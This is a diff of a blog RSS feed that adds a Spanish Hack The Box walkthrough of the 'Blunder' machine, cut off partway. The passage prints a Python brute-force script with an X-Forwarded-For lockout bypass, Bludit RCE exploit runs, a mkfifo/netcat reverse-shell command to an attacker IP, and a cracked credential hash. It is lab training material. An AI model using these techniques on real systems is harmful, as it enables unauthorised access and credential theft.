@@ -5,9 +5,621 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 14 Jun 2023 18:36:00 +0000</pubDate>
-    <lastBuildDate>Wed, 14 Jun 2023 18:36:00 +0000</lastBuildDate>
+    <pubDate>Thu, 15 Jun 2023 00:01:13 +0000</pubDate>
+    <lastBuildDate>Thu, 15 Jun 2023 00:01:13 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Blunder - htb writeup</title>
+        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Blunder&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor &lt;code&gt;BLUDIT CMS&lt;/code&gt; que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de &lt;code&gt;sudo&lt;/code&gt; con la que conseguiremos acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Maquina interesante asi que a darle!&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Blunder
+❯ ls
+ Blunder
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.191
+PING 10.10.10.191 (10.10.10.191) 56(84) bytes of data.
+64 bytes from 10.10.10.191: icmp_seq=1 ttl=63 time=265 ms
+
+--- 10.10.10.191 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 265.087/265.087/265.087/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.191 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 18:55 GMT
+Initiating SYN Stealth Scan at 18:55
+Scanning 10.10.10.191 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.191
+Completed SYN Stealth Scan at 18:55, 26.57s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.191
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-06-14 18:55:12 GMT for 26s
+Not shown: 65533 filtered tcp ports (no-response), 1 closed tcp port (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds
+           Raw packets sent: 131086 (5.768MB) | Rcvd: 21 (920B)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Solamente vemos que se encuentra abierto el puerto &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80 10.10.10.191 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 19:00 GMT
+Nmap scan report for 10.10.10.191
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+|_http-generator: Blunder
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.41&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos usando &lt;code&gt;whatweb&lt;/code&gt;, para enumerar las tecnologias que emplea el servicio web, desde consola.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.191
+http://10.10.10.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La herramienta nos reporta que se el gestor de contenido del servicio web corresponde a un &lt;code&gt;bludit CMS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Bludit: Bludit es una aplicación web para construir tu propio sitio web o blog en segundos, es completamente gratis y de código abierto&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Seguidmente vamos abrir la web en el navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos que a simple vista la pagina no muestra contenido interesante. Por ello intentaremos enumerar rutas expuestas del servicio con la herramienta &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/xmendez/wfuzz&quot;&gt;https://github.com/xmendez/wfuzz&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000000026:   200        105 L    303 W      3280 Ch     &quot;about&quot;                                                                                                               
+000000259:   301        0 L      0 W        0 Ch        &quot;admin&quot;                                                                                                               
+000000124:   200        170 L    918 W      7561 Ch     &quot;0&quot;                                                                                                                   
+000002551:   200        110 L    387 W      3959 Ch     &quot;usb&quot;                                                                                                                 
+000003295:   200        21 L     171 W      1083 Ch     &quot;LICENSE&quot;      
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues de unos instantes &lt;code&gt;wfuzz&lt;/code&gt; nos reporta rutas validas, en las cuales podemos ver una de &lt;code&gt;admin&lt;/code&gt; y si vamos a esa ruta nos redirige a un panel de inicio de sesión.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a tratar de validar si existe una ruta &lt;code&gt;robots.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que efectivamente existe, ahora haciendo un poco de guesing quiero pensar que existen otros archivo con la extensión &lt;code&gt;.txt&lt;/code&gt; en las rutas, asi que nuevamente con &lt;code&gt;wfuzz&lt;/code&gt; vamos a validar si existen.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ.txt
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ.txt
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000001765:   200        1 L      4 W        22 Ch       &quot;robots&quot;                                                                                                              
+000002495:   200        4 L      23 W       118 Ch      &quot;todo&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podemos ver que ademas del robots.txt, existe un archivo &lt;code&gt;todo.txt&lt;/code&gt; y si lo visualizamos en el navegador obtenemos un usuario &lt;code&gt;fergus&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora volvamos a el panel de logeo y interceptemos la petición que se realiza con la ayuda de &lt;code&gt;burpsuite&lt;/code&gt; y el &lt;code&gt;foxyproxy&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos abrimos &lt;code&gt;burpsuite&lt;/code&gt; y vemos como se transmite la petición.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que se envia una petición &lt;code&gt;POST&lt;/code&gt; con algunos parametros, incluidos un &lt;code&gt;Token CSRF&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ahora ya que disponemos de un usuario valido podriamos tratar de mediante un ataque de fuerza bruta obtener la contrasena, pero para ello necesitamos usar un diccionario de contraseñas.&lt;/p&gt;
+
+&lt;p&gt;Anterirmente vimos que la pagina web contenia bastante texto, por que podriamos tratar e hacer un diccionario con las palabras usadas, para ello usaremos la herramienta &lt;code&gt;cewl&lt;/code&gt; y al pasarle la ip de la web podemos crearnos un diccionario en base a sus palabras y lo exportaremos en un fichero de nombre &lt;code&gt;dictionary.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cewl -w dictionary.txt http://10.10.10.191
+CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+❯ ls
+ dictionary.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;AHora que disponemos de un usuario valido &lt;code&gt;fergus&lt;/code&gt; y de un diccionario de posibles contraseñas &lt;code&gt;dictionary.txt&lt;/code&gt;, podemos crearnos un script en &lt;code&gt;python&lt;/code&gt; para automatizar el proceso de fuerza bruta y averiguar la contraseña valida.&lt;/p&gt;
+
+&lt;p&gt;Llamaremos a nuestro &lt;code&gt;exploit&lt;/code&gt; bludit.py.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
+
+
+from pwn import *
+import requests, re
+
+
+def def_handler(sig, frame):
+    print(&quot;\n[!]Saliendo...!\n&quot;)
+    sys.exit(1)
+
+#ctrl_c
+signal.signal(signal.SIGINT, def_handler)
+#variables_globales
+main_url = &quot;http://10.10.10.191/admin/&quot;
+
+
+def makeRequests():
+
+    s = requests.session()
+
+    passwords = open(&quot;dictionary.txt&quot;, 'r')
+
+    p1 = log.progress(&quot;Fuerza Bruta&quot;)
+    p1.status(&quot;Iniciando proceso de Fuerza Bruta&quot;)
+    time.sleep(2)
+
+    counter = 1
+
+    for password in passwords.readlines():
+        
+        password = password.strip('\n')
+       
+        p1.status(&quot;Probando con la password [%d/349]: %s&quot; % (counter, password))
+
+        r = s.get(main_url)
+
+        tokenCSRF = re.findall(r'name=&quot;tokenCSRF&quot; value=&quot;(.*?)&quot;', r.text)[0]
+
+        post_data = {
+                &quot;tokenCSRF&quot;: tokenCSRF,
+                &quot;username&quot;: &quot;fergus&quot;,
+                &quot;password&quot;: password,
+                &quot;save&quot;: ''
+        }
+
+
+        r = s.post(main_url, data=post_data)
+        counter += 1
+
+        if &quot;Username or password incorrect&quot; not in r.text:
+            p1.success(&quot;La contraseña es %s&quot; % password)
+            sys.exit(0)
+
+if __name__=='__main__':
+
+    makeRequests()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos el exploit y despues de unos segundos nos valida que la contraseña es: &lt;code&gt;King&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 prueba.py
+[+] Fuerza Bruta: La contraseña es King
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Probamos a logearnos en el servicio y vemos que las credenciales son incorrectas, ademas vemos un mensaje que nos dice que nuestra ip fue bloqueada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Investigando un poco vemos que existe una forma de bypasear el uso de fuerza bruta en &lt;code&gt;Bludit&lt;/code&gt;, atraves de la cabezera &lt;code&gt;X-Forwarded-For&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&quot;&gt;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Modificamos nuestro exploit y añadismos la cabezera &lt;code&gt;X-Forwarded-For&lt;/code&gt;, con el valor de nuestra variable &lt;code&gt;password&lt;/code&gt;, aprovechando que este por cada iteración sera aleatorio,&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
+
+from pwn import *
+import requests, re
+
+
+def def_handler(sig, frame):
+    print(&quot;\n[!]Saliendo...!\n&quot;)
+    sys.exit(1)
+
+#ctrl_c
+signal.signal(signal.SIGINT, def_handler)
+#variables_globales
+main_url = &quot;http://10.10.10.191/admin/&quot;
+
+
+def makeRequests():
+
+    s = requests.session()
+
+    passwords = open(&quot;dictionary.txt&quot;, 'r')
+
+    p1 = log.progress(&quot;Fuerza Bruta&quot;)
+    p1.status(&quot;Iniciando proceso de Fuerza Bruta&quot;)
+    time.sleep(2)
+
+    counter = 1
+    for password in passwords.readlines():
+        
+        password = password.strip('\n')
+        
+        p1.status(&quot;Probando con la paassword [%d / 349] %s&quot; % (counter, password))
+
+        r = s.get(main_url)
+
+        tokenCSRF = re.findall(r'name=&quot;tokenCSRF&quot; value=&quot;(.*?)&quot;', r.text)[0]
+
+        post_data = {
+                &quot;tokenCSRF&quot;: tokenCSRF,
+                &quot;username&quot;: &quot;fergus&quot;,
+                &quot;password&quot;: password,
+                &quot;save&quot;: ''
+        }
+
+        myHeaders = {
+            'X-Forwarded-For': password
+        }
+
+        r = s.post(main_url, data=post_data, headers=myHeaders)
+        counter += 1
+
+        if &quot;Username or password incorrect&quot; not in r.text:
+            p1.success(&quot;La contraseña es %s&quot; % password)
+            sys.exit(0)
+
+if __name__=='__main__':
+
+    makeRequests()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues de unos instantes logramos obtener la contraseña del usuario &lt;code&gt;fergus:RolandDeschain&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 bludit.py
+[.] Fuerza Bruta: Probando con la password the
+[+] Fuerza Bruta: La contraseña es RolandDeschain
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Validamos la contraseña en la pagina de logeo y ganamos acceso a un panel de dashboard.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora buscamos vulnerabilidades asociadas a &lt;code&gt;bludit&lt;/code&gt;, encontramos un exploit en python asociado &lt;code&gt;Directory Traversal&lt;/code&gt; que deriva en ejecución remota de comandos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit bludit
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                          | php/remote/47699.rb
+Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                                                                                                | php/webapps/50529.txt
+Bludit 3.9.12 - Directory Traversal                                                                                                                  | php/webapps/48568.py
+Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                | php/webapps/48942.py
+Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                         | php/webapps/49037.rb
+Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                           | php/webapps/48746.rb
+Bludit 3.9.2 - Directory Traversal                                                                                                                   | multiple/webapps/48701.txt
+bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                                    | php/webapps/46060.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos traemos el exploit y al ejecutarlo nos pide algunos parametros&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -m php/webapps/48568.py
+  Exploit: Bludit 3.9.12 - Directory Traversal
+      URL: https://www.exploit-db.com/exploits/48568
+     Path: /usr/share/exploitdb/exploits/php/webapps/48568.py
+File Type: Python script, ASCII text executable, with very long lines
+
+Copied to: /home/fmiracle/Git/firtsmiracle.github.io/assets/images/HTB/htb-writeup-Blunder/48568.py
+❯ mv 48568.py exploit_bludit.py
+❯ python3 exploit_bludit.py
+
+
+╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
+╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
+╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
+
+ CVE-2019-16113 CyberVaca
+
+
+usage: exploit_bludit.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND
+exploit_bludit.py: error: the following arguments are required: -u, -user, -pass, -c
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos el exploit con los parametros correspondientes y con &lt;code&gt;-c&lt;/code&gt; especificamos el comandos que deseamos ejecutar, para ello probaremos enviarnos una traza a nuestra maquina.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'ping 10.10.16.4'
+
+
+╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
+╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
+╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
+
+ CVE-2019-16113 CyberVaca
+
+
+[+] csrf_token: 56c6bb6a8ba8cb234b81e3fc60794fa537f591c6
+[+] cookie: tg456638i906rknr4n27it5kr3
+[+] csrf_token: 0208621fe6b05f215d6f16a7675200b78af3cd2b
+[+] Uploading tdbdwfqf.jpg
+[+] Executing command: ping 10.10.16.4
+[+] Delete: .htaccess
+[+] Delete: tdbdwfqf.jpg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;y vemos que recibimos la traza en nuestro equipo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+20:48:34.774870 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 1, length 64
+20:48:34.774896 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 1, length 64
+20:48:35.702537 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 2, length 64
+20:48:35.702583 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 2, length 64
+20:48:36.774871 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 3, length 64
+20:48:36.774913 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 3, length 64
+20:48:37.615149 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 4, length 64
+20:48:37.615194 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 4, length 64
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo siguiente sera mandaremos una reverse shell con la versión antigua de &lt;code&gt;ntcat&lt;/code&gt; haciendo uso de &lt;code&gt;mkfifo&lt;/code&gt; a nuestra maquina.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.16.4 443 &amp;gt;/tmp/f'
+
+
+╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
+╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
+╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
+
+ CVE-2019-16113 CyberVaca
+
+
+[+] csrf_token: cc25e735f2604125be5c2142412dbe2253a33fea
+[+] cookie: a8c95lrdmos65m0545e9fflgh4
+[+] csrf_token: 0f6fc1b9b0455869059adf72375ddcb9cef563bb
+[+] Uploading rubnxlev.jpg
+[+] Executing command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.16.4 443 &amp;gt;/tmp/f
+[+] Delete: .htaccess
+[+] Delete: rubnxlev.jpg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.191.
+Ncat: Connection from 10.10.10.191:47166.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como de constumbre vamos a otorgarnos una &lt;code&gt;tty full interactive&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
+Script started, file is /dev/null
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export TERM=xterm
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export SHELL=bash
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ stty rows 45 columns 184
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Enumerando el sistema dentro en el directorio &lt;code&gt;bludit-3-10-0a&lt;/code&gt;, encontramos el archivo &lt;code&gt;users.php&lt;/code&gt; con un password en hash que podemos tratar de crackear.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
+&amp;lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&amp;gt;
+{
+    &quot;admin&quot;: {
+        &quot;nickname&quot;: &quot;Hugo&quot;,
+        &quot;firstName&quot;: &quot;Hugo&quot;,
+        &quot;lastName&quot;: &quot;&quot;,
+        &quot;role&quot;: &quot;User&quot;,
+        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
+        &quot;email&quot;: &quot;&quot;,
+        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
+        &quot;tokenRemember&quot;: &quot;&quot;,
+        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
+        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
+        &quot;twitter&quot;: &quot;&quot;,
+        &quot;facebook&quot;: &quot;&quot;,
+        &quot;instagram&quot;: &quot;&quot;,
+        &quot;codepen&quot;: &quot;&quot;,
+        &quot;linkedin&quot;: &quot;&quot;,
+        &quot;github&quot;: &quot;&quot;,
+        &quot;gitlab&quot;: &quot;&quot;}
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para ello usaremos nuestro web de confianza y logramos decifrar la contraseña la cual es &lt;code&gt;Password120&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
